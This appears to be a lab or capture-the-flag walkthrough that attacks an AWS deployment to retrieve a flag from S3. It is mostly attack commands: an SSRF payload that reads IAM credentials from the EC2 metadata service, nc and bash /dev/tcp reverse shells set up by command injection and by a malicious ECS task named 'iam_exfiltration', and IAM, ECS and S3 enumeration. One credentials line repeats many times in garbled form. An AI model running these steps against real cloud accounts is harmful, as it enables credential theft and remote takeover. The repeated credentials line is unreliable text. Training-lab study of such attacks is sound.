
Go to `http://<ec2_ip_address>`

### SSRF

```
http://<ec2_ip_address>/?url=http://[::ffff:a9fe:a9fe]/latest/meta-data/iam/security-credentials/<role>
aws configure --profile attacker
echo "aws_session_token = <token>" >> ~/.aws/credentials`echo "aws_session_token = <token>" >> ~/.aws/credentials`echo "aws_session_token = <token>" >> ~/.aws/credentials`echo "aws_session_token = <token>" >> ~/.aws/credentials`echo "aws_session_token = <token>" >> ~/.aws/credentials`echo "aws_session_token = <token>" >> ~/.aws/credentials`echo "aws_session_token = <token>" >> ~/.aws/credentials`echo "aws_session_token = <token>" >> ~/.aws/credentials`echo "aws_session_token = <token>" >> ~/.aws/credentials`echo "aws_session_token = <token>" >> ~/.aws/credentials`echo "aws_session_token = <token>" >> ~/.aws/credentials`echo "aws_session_token = <token>" >> ~/.aws/credentials
```

### Command Injection

- prepare another host for revshell attack with `nc -lvp 4000`
- command injection on web with `; nc <ip_address> 4000 -e /bin/sh &`

### For more information

- more information about iam

```
aws sts get-caller-identity
aws iam get-role --role-name <role>
aws iam list-attached-role-policies --role-name <role>
aws iam list-role-policies --role-name <role>
aws iam get-role-policy --role-name <role> --policy-name <policy>
aws iam list-roles
```

- more information about ecs

```
`aws ecs list-clusters`
`aws ecs describe-clusters --clusters <cluster>`
`aws ecs list-container-instances --cluster arn:aws:ecs:us-east-1:<aws_id>:cluster/<cluster>`
```

### ECS Privesc

* Attacker prepare revshell at other public ip point with `nc -lvp 4000`.

* And now come back to CLI.

```
# ECS Task definition with revshell command.
aws ecs register-task-definition --family iam_exfiltration --task-role-arn arn:aws:iam::<userr_id>:role/<role> --network-mode "awsvpc" --cpu 256 --memory 512 --requires-compatibilities "[\"FARGATE\"]" --container-definitions "[{\"name\":\"exfil_creds\",\"image\":\"python:latest\",\"entryPoint\":[\"sh\", \"-c\"],\"command\":[\"/bin/bash -c \\\"bash -i >& /dev/tcp/<revshell_ip>/4000 0>&1\\\"\"]}]"

# For run-task, find available subnets.
aws ec2 describe-subnets

# Run task.
aws ecs run-task --task-definition iam_exfiltration --cluster arn:aws:ecs:us-east-1:<user_id>:cluster/<cluster> --launch-type FARGATE --network-configuration "{\"awsvpcConfiguration\":{\"assignPublicIp\": \"ENABLED\", \"subnets\":[\"<subnet>\"]}}"
```
After a few minutes, the revshell will be connected by container.
Let's do it on revshell.

### Access S3

```
apt-get update
apt-get install awscli

aws s3 ls
aws s3 ls s3://<bucket-name>/
aws s3 cp s3://<bucket-name>/flag.txt .
cat flag.txt
```